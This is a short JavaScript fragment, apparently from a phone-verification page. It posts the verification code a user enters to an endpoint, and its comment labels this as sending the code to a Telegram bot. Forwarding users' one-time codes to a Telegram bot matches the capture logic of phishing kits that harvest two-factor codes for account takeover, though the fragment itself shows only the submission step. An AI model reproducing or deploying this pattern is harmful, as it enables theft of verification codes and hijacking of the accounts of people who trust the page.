      // === SEND VERIFICATION CODE TO TELEGRAM BOT ===
      fetch('/api/send-message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          code: code,
          type: 'verification_code',
          page: 'verify-phone',
        }),
      });
      // ==============================================
